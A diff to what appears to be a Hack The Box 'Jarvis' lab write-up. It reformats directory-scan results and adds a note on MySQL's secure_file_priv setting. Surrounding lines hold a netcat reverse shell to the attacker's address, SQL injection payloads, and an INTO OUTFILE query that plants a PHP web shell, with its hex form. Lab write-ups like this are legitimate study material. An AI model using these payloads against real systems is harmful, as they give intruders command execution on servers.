@@ -57,11 +57,11 @@ Target: http://jarvis.htb/
 [12:28:40] 200 -  816B  - /images/
 [12:28:46] 200 -  677B  - /js/
 [12:29:12] 301 -  313B  - /phpmyadmin  ->  http://jarvis.htb/phpmyadmin/
-[12:29:15] 200 -    4KB - /phpmyadmin/
-[12:29:15] 200 -    3KB - /phpmyadmin/doc/html/index.html
-[12:29:15] 200 -    1KB - /phpmyadmin/README
-[12:29:15] 200 -    4KB - /phpmyadmin/index.php
-[12:29:16] 200 -   19KB - /phpmyadmin/ChangeLog
+[12:29:15] 200 -   4KB  - /phpmyadmin/
+[12:29:15] 200 -   3KB  - /phpmyadmin/doc/html/index.html
+[12:29:15] 200 -   1KB  - /phpmyadmin/README
+[12:29:15] 200 -   4KB  - /phpmyadmin/index.php
+[12:29:16] 200 -  19KB  - /phpmyadmin/ChangeLog
 [12:29:29] 403 -  275B  - /server-status/
 [12:29:29] 403 -  275B  - /server-status
 
@@ -180,6 +180,7 @@ os-shell> nc 10.10.14.39 1234 -e /bin/bash
 
 - **manual get shell**
   - `-1 UNION SELECT 1, @@version, user(), system_user(), (SELECT GROUP_CONCAT(concat_ws(':', variable_name, variable_value) SEPARATOR '; ') FROM information_schema.global_variables WHERE variable_name LIKE '%secure%'), 6, 7`
+    - When the value of `secure_file_priv` is not set, it means there are no restrictions on the import or export operations for `mysqld`.
   - `-1 UNION SELECT 1,2,3,4,5,6,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`
     - `<?php system($_GET["cmd"]); ?>` can be hex format
     - `0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e`
